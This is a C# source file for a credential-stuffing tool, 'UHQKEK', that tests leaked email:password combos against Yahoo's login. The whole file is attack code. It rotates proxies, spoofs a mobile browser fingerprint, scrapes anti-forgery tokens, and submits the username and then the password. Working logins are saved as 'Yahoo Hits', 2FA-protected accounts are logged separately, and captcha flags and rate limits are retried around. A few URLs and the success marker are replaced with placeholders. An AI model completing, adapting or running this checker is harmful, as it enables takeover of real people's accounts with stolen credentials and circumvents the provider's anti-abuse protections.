using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class Yahoo
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                string str1 = Yahoo.RandomDigits(12);
                httpRequest.AddHeader("Host", "login.yahoo.com");
                httpRequest.AddHeader("Accept-Encoding", "gzip");
                httpRequest.AddHeader("User-Agent", "okhttp/3.9.0");
                httpRequest.AllowAutoRedirect = true;
                string str2 = httpRequest.Get("URL HERE" + str1).ToString();
                string str3 = str2.Substring(str2.IndexOf("acrumb") + 15, 8);
                string str4 = str2.Substring(str2.IndexOf("\"crumb") + 15, 9);
                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "login.yahoo.com");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 11; AC2001 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Referer", "URL HERE" + str1);
                string str5 = httpRequest.Post("URL HERE" + str1, "browser-fp-data={\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":8,\"pixelRatio\":2.8125,\"hardwareConcurrency\":8,\"timezoneOffset\":-330,\"timezone\":\"Asia/Calcutta\",\"sessionStorage\":1,\"indexedDb\":1,\"cpuClass\":\"unknown\",\"platform\":\"Linux aarch64\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":0,\"hash\":\"24700f9f1986800ab4fcc880530dd0ed\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"Qualcomm~Adreno (TM) 620\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":0,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":5,\"event\":1,\"start\":1},\"fonts\":{\"count\":11,\"hash\":\"1b3c7bec80639c771f8258bd6a3bf2c6\"},\"audio\":\"124.08072787804849\",\"resolution\":{\"w\":\"384\",\"h\":\"854\"},\"availableResolution\":{\"w\":\"854\",\"h\":\"384\"},\"ts\":{\"serve\":1624201563845,\"render\":1624201564544}}&crumb=" + str4 + "&acrumb=" + str3 + "&sessionIndex=QQ--&displayName=&deviceCapability={\"pa\":{\"status\":false}}&username=" + strArray1[0] + "&passwd=&signin=Next", "application/x-www-form-urlencoded").ToString();
                string str6 = str5.ToString();
                if (str5.Contains("messages.INVALID_USERNAME") || str5.Contains("errorMsg\":\"Sorry, we don't recognize this email") || str5.Contains("{\"location\":\"/account/challenge/fail"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else if (str5.Contains("/account/challenge/recaptcha"))
                {
                    Program.Flag.Add(combo);
                    int a = Falgger(combo);
                    if (a >= 10)
                    {
                        ++Program.Free;
                        Program.Save(combo, "Yahoo Flagged");
                        return false;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }
                }
                else if (str5.Contains("account/challenge/yak-code") || str5.Contains("rate limited") || str5.Contains("504 Gateway Timeout") || str5.Contains("messages.ERROR_NOTFOUND"))
                {
                    ++Program.Retrie;
                    return false;
                }
                else if (str5.Contains("location\":\"/account/challenge/password"))
                {
                    string str7 = str6.Replace("{\"location\":\"", "").Replace("\"}", "");
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = false;
                    httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                    httpRequest.AddHeader("Host", "login.yahoo.com");
                    httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                    httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                    httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 11; AC2001 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36");
                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    httpRequest.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");
                    httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                    httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                    httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                    httpRequest.AddHeader("Referer", "https://login.yahoo.com" + str7);
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                    httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    string str8 = httpRequest.Post("https://login.yahoo.com" + str7, "browser-fp-data={\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":8,\"pixelRatio\":2.8125,\"hardwareConcurrency\":8,\"timezoneOffset\":-330,\"timezone\":\"Asia/Calcutta\",\"sessionStorage\":1,\"indexedDb\":1,\"cpuClass\":\"unknown\",\"platform\":\"Linux+aarch64\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":0,\"hash\":\"24700f9f1986800ab4fcc880530dd0ed\"},\"canvas\":\"canvas+winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"Qualcomm~Adreno+(TM)+620\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":0,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":5,\"event\":1,\"start\":1},\"fonts\":{\"count\":11,\"hash\":\"1b3c7bec80639c771f8258bd6a3bf2c6\"},\"audio\":\"124.08072787804849\",\"resolution\":{\"w\":\"384\",\"h\":\"854\"},\"availableResolution\":{\"w\":\"854\",\"h\":\"384\"},\"ts\":{\"serve\":1624204041554,\"render\":1624204042082}}&crumb" + str4 + "=&acrumb=" + str3 + "&sessionIndex=QQ--&displayName=" + strArray1[0] + "&username=" + strArray1[0] + "&passwordContext=normal&isShowButtonClicked=true&showButtonStatus=true&prefersReducedMotion=&password=" + strArray1[1] + "&verifyPassword=Next", "application/x-www-form-urlencoded").ToString();
                    httpRequest.Address.ToString();
                    bool num = str8.Contains("<p>Found. Redirecting to <a href=\"/account/challenge/password?") || str8.Contains("Invalid password. Please try again") || str8.Contains("<a href=\"/account/challenge/password?.asdk_embedded=1&amp;.lang=en-US&amp;aembed=1");
                    bool flag = str8.Contains("/account/challenge/challenge-selector");
                    if (str8.Contains("SUCESS KEY HERE"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo}", Color.Green);
                        }
                        Program.Save(combo, "Yahoo Hits");
                        return true;
                    }
                    else if (num)
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        ////Program.Save(combo, "Invalids");
                        return true;
                    }
                    else if (flag)
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo}", Color.Orange);
                        }
                        Program.Save(combo, "Yahoo 2FA");
                        return true;
                    }
                    else if (str8.Contains("rate limited"))
                    {
                        ++Program.Retrie;
                        return false;
                    }
                    else if (str5.Contains("/account/challenge/recaptcha"))
                    {
                        Program.Flag.Add(combo);
                        int a = Falgger(combo);
                        if (a >= 10)
                        {
                            ++Program.Free;
                            Program.Save(combo, "Yahoo Flagged");
                            return false;
                        }
                        else
                        {
                            ++Program.Retrie;
                            return false;
                        }
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
        public static string RandomDigits(int length)
        {
            Random random = new Random();
            string empty = string.Empty;
            for (int index = 0; index < length; ++index)
                empty += random.Next(10).ToString();
            return empty;
        }
        public static int Falgger(string c1)
        {
            int count = Program.Flag.Where(x => x.Equals(c1)).Count();
            return count;
        }
    }
}
